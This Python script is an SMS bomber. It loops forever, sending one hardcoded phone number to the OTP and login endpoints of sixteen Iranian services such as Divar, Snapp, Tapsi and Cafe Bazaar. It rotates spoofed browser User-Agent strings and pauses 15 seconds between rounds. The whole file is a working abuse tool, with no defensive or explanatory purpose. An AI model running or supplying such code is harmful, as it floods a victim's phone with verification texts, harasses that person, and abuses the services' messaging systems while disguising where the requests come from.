from cgitb import html
import requests
import time
import random
headers = [
    {
        'User-Agent':'Mozilla/5.0 (Linux; Android 12; SM-S906N Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/80.0.3987.119 Mobile Safari/537.36',
        'Accept': '*/*'
    },
    {
        'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0',
        'Accept': '*/*'
    },
    {
        'User-Agent':'Mozilla/5.0 (Linux; Android 12; Pixel 6 Build/SD1A.210817.023; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/94.0.4606.71 Mobile Safari/537.36',
        'Accept': '*/*'
    },
    {
        'User-Agent':'Mozilla/5.0 (iPhone14,3; U; CPU iPhone OS 15_0 like Mac OS X) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Mobile/19A346 Safari/602.1',
        'Accept': '*/*'
    },
    {
        'User-Agent':'Mozilla/5.0 (iPhone12,1; U; CPU iPhone OS 13_0 like Mac OS X) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Mobile/15E148 Safari/602.1',
        'Accept': '*/*'
    },
]
num1 = '9935701859'
num2 = '9935701859'

url_divar = "https://api.divar.ir/v5/auth/authenticate"
json_divar = [{"phone":num1},{"phone":num2}]

url_snapp = "https://app.snapp.taxi/api/api-passenger-oauth/v2/otp"
json_snapp = [{"cellphone":num1},{"cellphone":num2}]

url_snappfood = "https://snappfood.ir/mobile/v2/user/loginMobileWithNoPass?lat=35.774&long=51.418&optionalClient=WEBSITE&client=WEBSITE&deviceType=WEBSITE&appVersion=8.1.1&UDID=e2272a64-a9ed-418e-9852-c83815d7d16d&locale=fa"
json_snappfood = [{'cellphone':'0' + num1},{'cellphone':'0' + num2}]

url_bazzar = "https://api.cafebazaar.ir/rest-v1/process/GetOtpTokenRequest"
json_bazzar = [{"properties":{"language":2,"clientID":"3luck1iawm7m2kgv44gtbqhegj8190yd","deviceID":"3luck1iawm7m2kgv44gtbqhegj8190yd","clientVersion":"web"},"singleRequest":{"getOtpTokenRequest":{"username":"98" + num1}}},{"properties":{"language":2,"clientID":"3luck1iawm7m2kgv44gtbqhegj8190yd","deviceID":"3luck1iawm7m2kgv44gtbqhegj8190yd","clientVersion":"web"},"singleRequest":{"getOtpTokenRequest":{"username":"98" + num2}}}]

url_shaypoor = "https://www.sheypoor.com/api/v10.0.0/auth/send"
json_shaypoor = [{"username":"0" + num1},{"username":"0" + num2}]

url_tapsi = "https://api.tapsi.cab/api/v2.2/user"
json_tapsi = [{"credential":{"phoneNumber":"0" + num1,"role":"PASSENGER"},"otpOption":"SMS"},{"credential":{"phoneNumber":"0" + num2,"role":"PASSENGER"},"otpOption":"SMS"}]

url_snappbox = "https://app.snapp.taxi/api/api-passenger-oauth/v2/otp"
json_snappbox = [{"cellphone":num1},{"cellphone":num2}]

url_sd = "https://core.snapp.doctor/Api/Common/v1/sendVerificationCode/"
url_last_path = "/sms?cCode=+98"
json_sd = [num1,num2]

url_snapproom = "https://napi.snapproom.com/users/self/verification-flow"
json_snapproom = [{"username": "0" + num1},{"username": "0" + num2}]

url_snappshop = "https://newapi.snappshop.ir/mobile/v4/user/loginMobileWithNoPass?client=SUPERAPP_SPLITPAGE&optionalClient=SUPERAPP_SPLITPAGE&deviceType=SUPERAPP_SPLITPAGE&appVersion=5.6.6&optionalVersion=5.6.6&UDID=472d994f-c492-4a34-a39a-4ac4c2588074"
json_snappshop = [{"cellphone": "0" + num1, 'captcha': '', 'local': ''},{"cellphone": "0" + num2, 'captcha': '', 'local': ''}]

url_snappdeiver = "https://digitalsignup.snapp.ir/ds3/api/v3/otp"
json_snappdeiver = [{"cellphone": "0" + num1},{"cellphone": "0" + num2}]


url_hm = "https://www.hamrah-mechanic.com/api/v1/membership/otp"
json_hm = [{"PhoneNumber":"" + num1,"prevDomainUrl":"https://www.google.com/","landingPageUrl":"https://www.hamrah-mechanic.com/","orderPageUrl":"https://www.hamrah-mechanic.com/membersignin/","prevUrl":'',"referrer":"https://www.google.com/"},{"PhoneNumber":"0" + num2,"prevDomainUrl":"https://www.google.com/","landingPageUrl":"https://www.hamrah-mechanic.com/","orderPageUrl":"https://www.hamrah-mechanic.com/membersignin/","prevUrl":'',"referrer":"https://www.google.com/"}]

url_niazchi = "https://www.niazchi.com/wp-admin/admin-ajax.php"
json_niazchi = [{'action':'register_action',"number": "0" + num1},{'action':'register_action',"number": "0" + num2}]

url_itoll = "https://app.itoll.ir/api/v1/auth/login"
json_itoll = [{"mobile": "0" + num1},{"mobile": "0" + num2}]

url_pishkhan24 = "https://application.monshiplus.ayantech.ir/WebServices/App.svc/deviceRegistrationRequest"
json_pishkhan24 = [{"Identity":{"Token":"15FFFDD146354912A66197B0C0BC9229"},"Parameters":{"MobileNumber":"0" + num1}},{"Identity":{"Token":"15FFFDD146354912A66197B0C0BC9229"},"Parameters":{"MobileNumber":"0" + num2}}]

url_ghabzino = "https://application2.billingsystem.ayantech.ir/WebServices/Core.svc/requestActivationCode"
json_ghabzino = [{"Identity":{"Token":'null'},"Parameters":{"ApplicationType":"Web","ApplicationUniqueToken":'null',"ApplicationVersion":"1.0.0","MobileNumber":"0" + num1,"UniqueToken":'null'}},{"Identity":{"Token":'null'},"Parameters":{"ApplicationType":"Web","ApplicationUniqueToken":'null',"ApplicationVersion":"1.0.0","MobileNumber":"0" + num2,"UniqueToken":'null'}}]


while True:
    random_headers = random.choice(headers)

    random_json_divar = random.choice(json_divar)
    random_json_snapp = random.choice(json_snapp)
    random_json_snappfood = random.choice(json_snappfood)
    random_json_bazzar = random.choice(json_bazzar)
    random_json_shaypoor = random.choice(json_shaypoor)
    random_json_tapsi = random.choice(json_tapsi)
    random_json_snappbox = random.choice(json_snappbox)
    random_json_sd = random.choice(json_sd)
    random_json_snapproom = random.choice(json_snapproom)
    random_json_snappshop = random.choice(json_snappshop)
    random_json_snappdeiver = random.choice(json_snappdeiver)
    random_json_hm = random.choice(json_hm)
    random_json_niazchi = random.choice(json_niazchi)
    random_json_itoll = random.choice(json_itoll)
    random_json_pishkhan24 = random.choice(json_pishkhan24)
    random_json_ghabzino = random.choice(json_ghabzino)

    req_divar = requests.post(url=url_divar, json=random_json_divar, headers=random_headers)
    print(req_divar)
    print('Divar Send')

    req_snapp = requests.post(url=url_snapp, json=random_json_snapp, headers=random_headers)
    print(req_snapp)
    print('Snapp Send')

    req_snappfood = requests.Session()
    req_snappfood.post(url_snappfood,headers=random_headers,data=random_json_snappfood)
    print(req_snappfood)
    print('SnappFood Send')

    req_bazzar = requests.post(url=url_bazzar, json=random_json_bazzar, headers=random_headers)
    print(req_bazzar)
    print('Bazzar Send')

    req_shaypoor = requests.post(url=url_shaypoor, json=random_json_shaypoor, headers=random_headers)
    print(req_shaypoor)
    print('Shaypoor Send')

    req_tapsi = requests.post(url=url_tapsi, json=random_json_tapsi, headers=random_headers)
    print(req_tapsi)
    print('Tapsi Send')

    req_snappbox = requests.post(url=url_snappbox, json=random_json_snappbox, headers=random_headers)
    print(req_snappbox)
    print('SnappBox Send')

    req_sd = requests.get(url=url_sd + random_json_sd + url_last_path, headers=random_headers)
    print(req_sd)
    print('SnappDoctor Send')

    req_snapproom = requests.post(url=url_snapproom, json=random_json_snapproom, headers=random_headers)
    print(req_snapproom)
    print('SnappRoom Send')
    
    req_snappshop = requests.Session()
    req_snappshop.post(url_snappshop,headers=random_headers,data=random_json_snappshop)
    print(req_snappshop)
    print('SnappShop Send')

    req_snappdeiver = requests.Session()
    req_snappdeiver.post(url_snappdeiver,headers=random_headers,data=random_json_snappdeiver)
    print(req_snappdeiver)
    print('SnappDriver Send')

    req_hm = requests.post(url=url_hm, json=random_json_hm, headers=random_headers)
    print(req_hm)
    print('HamrahMekanic Send')

    req_niazchi = requests.Session()
    req_niazchi.post(url_niazchi,headers=random_headers,data=random_json_niazchi)
    print(req_niazchi)
    print('Naizchi Send')

    req_itoll = requests.post(url=url_itoll, json=random_json_itoll, headers=random_headers)
    print(req_itoll)
    print('Itoll Send')

    req_pishkhan24 = requests.post(url=url_pishkhan24, json=random_json_pishkhan24, headers=random_headers)
    print(req_pishkhan24)
    print('Pishkhan24 Send')

    req_ghabzino = requests.post(url=url_ghabzino, json=random_json_ghabzino, headers=random_headers)
    print(req_ghabzino)
    print('Ghabzino Send')

    time.sleep(15)